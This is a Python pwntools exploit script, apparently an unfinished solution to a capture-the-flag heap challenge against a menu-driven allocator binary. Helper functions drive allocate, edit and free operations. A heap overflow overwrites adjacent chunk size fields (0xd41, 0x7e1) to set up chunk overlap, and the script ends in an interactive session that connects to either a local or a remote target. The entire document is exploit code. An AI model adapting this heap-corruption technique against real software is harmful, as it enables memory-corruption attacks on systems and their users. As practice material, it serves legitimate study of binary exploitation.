#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chall")
libc = e.libc
gs = """
c
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def allocate(size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"size: ", str(size).encode())
    p.recvuntil(b'ID:0x')
    return int(p.recvuntil(b' ').decode(), 16)


def edit(id, data):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b'id: ', str(id).encode())
    p.sendlineafter(b'data', data)


def release(id):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b'id: ', str(id).encode())


id0 = allocate(0x20)
edit(id0, b'A'*0x10)
# id1 = allocate(0x20)
# id2 = allocate(0x20)
edit(id0, b'A'*0x18+p64(0xd41)[:6])

id1 = allocate(0x400)
id2 = allocate(0x400)
id3 = allocate(0x400)
id4 = allocate(0x400)
release(id4)
release(id3)
release(id2)

id2 = allocate(0x400)
edit(id2, b'X'*0x3f0+p64(0)+p64(0x7e1)[:6])

p.interactive()
